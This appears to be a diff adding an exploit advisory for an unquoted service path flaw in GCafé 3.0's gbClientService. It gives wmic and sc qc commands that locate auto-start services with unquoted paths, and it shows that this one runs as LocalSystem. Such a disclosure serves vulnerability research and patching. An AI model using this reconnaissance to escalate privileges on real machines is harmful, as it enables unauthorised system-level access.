@@ -1,0 +1,31 @@
+# Exploit Title: _GCafé 3.0  - 'gbClienService' Unquoted Service Path
+# Google Dork: N/A
+# Date: 2019-11-09
+# Exploit Author: Doan Nguyen (4ll4u)
+# Vendor Homepage: https://gcafe.vn/
+# Software Link:  https://gcafe.vn/post/view?slug=gcafe-3.0
+# Version: v3.0
+# Tested on: Windows 7, Win 10, WinXP
+# CVE : N/A  
+# Description:
+# GCafé 3.0 - Internet Cafe is a software that supports the management of public Internet access points
+
+# PoC:
+
+# wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+gbClientService		gbClientService		C:\Program Files\GBillingClient\gbClientService.exe		Auto
+#C:\>sc qc gbClientService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: gbClientService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\GBillingClient\gbClientService.exe
+        LOAD_ORDER_GROUP   : GarenaGroup
+        TAG                : 0
+        DISPLAY_NAME       : gbClientService
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\>
